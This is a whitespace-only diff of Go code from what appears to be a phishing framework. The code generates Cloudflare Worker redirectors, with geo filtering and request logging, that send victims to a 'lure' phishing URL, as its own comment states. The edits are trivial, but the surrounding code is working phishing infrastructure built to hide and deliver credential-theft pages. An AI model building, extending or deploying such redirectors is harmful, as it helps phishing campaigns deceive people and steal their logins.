@@ -314,7 +314,7 @@ function blockAccess(reason) {
 
 func (g *CloudflareWorkerGenerator) GenerateWorker(config CloudflareWorkerConfig) (string, error) {
 	var tmplString string
-	
+
 	switch config.Type {
 	case WorkerTypeSimpleRedirect:
 		tmplString = workerTemplateSimpleRedirect
@@ -325,7 +325,7 @@ func (g *CloudflareWorkerGenerator) GenerateWorker(config CloudflareWorkerConfig
 	default:
 		return "", fmt.Errorf("unknown worker type: %s", config.Type)
 	}
-	
+
 	// Prepare template data
 	data := struct {
 		CloudflareWorkerConfig
@@ -333,7 +333,7 @@ func (g *CloudflareWorkerGenerator) GenerateWorker(config CloudflareWorkerConfig
 	}{
 		CloudflareWorkerConfig: config,
 	}
-	
+
 	// Convert geo filter to JSON
 	if len(config.GeoFilter) > 0 {
 		geoJson, err := json.Marshal(config.GeoFilter)
@@ -344,18 +344,18 @@ func (g *CloudflareWorkerGenerator) GenerateWorker(config CloudflareWorkerConfig
 	} else {
 		data.GeoFilterJson = "[]"
 	}
-	
+
 	// Parse and execute template
 	tmpl, err := template.New("worker").Parse(tmplString)
 	if err != nil {
 		return "", fmt.Errorf("template parse error: %v", err)
 	}
-	
+
 	var result strings.Builder
 	if err := tmpl.Execute(&result, data); err != nil {
 		return "", fmt.Errorf("template execute error: %v", err)
 	}
-	
+
 	return result.String(), nil
 }
 
@@ -364,10 +364,10 @@ func (g *CloudflareWorkerGenerator) GenerateWorkerFromLure(lure *Lure, workerTyp
 	if lure == nil {
 		return "", fmt.Errorf("lure cannot be nil")
 	}
-	
+
 	// Build the phishing URL — the worker redirects victims TO this URL
 	redirectUrl := fmt.Sprintf("https://%s%s", lure.Hostname, lure.Path)
-	
+
 	config := CloudflareWorkerConfig{
 		Type:            workerType,
 		RedirectUrl:     redirectUrl,
@@ -375,12 +375,12 @@ func (g *CloudflareWorkerGenerator) GenerateWorkerFromLure(lure *Lure, workerTyp
 		LogRequests:     true,
 		DelaySeconds:    2,
 	}
-	
+
 	// If lure has a redirector, load its HTML content for HTML redirector type
 	if workerType == WorkerTypeHtmlRedirector && lure.Redirector != "" {
 		// This could be expanded to load the actual redirector HTML
 		// For now, we'll use the default loading page
 	}
-	
+
 	return g.GenerateWorker(config)
 }
